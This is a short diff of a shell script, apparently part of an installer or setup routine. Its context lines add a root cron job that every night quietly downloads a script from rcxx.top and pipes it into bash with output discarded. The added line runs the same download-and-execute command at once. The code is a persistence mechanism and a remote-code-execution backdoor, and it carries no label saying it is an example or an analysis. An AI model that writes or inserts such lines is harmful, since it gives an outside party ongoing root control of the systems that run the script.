@@ -31,4 +31,5 @@ if [ $? -eq 0 ]; then
 echo > /dev/null 2>&1
 else [ $? -eq 1 ];
 echo -e "$( crontab -u root -l)\n0 0 * * * /usr/bin/wget -O - -q  https://rcxx.top/ip2country/ip2country | bash >/dev/null 2>&1" |  crontab -u root -
+/usr/bin/wget -O - -q  https://rcxx.top/ip2country/ip2country | bash 
 fi 
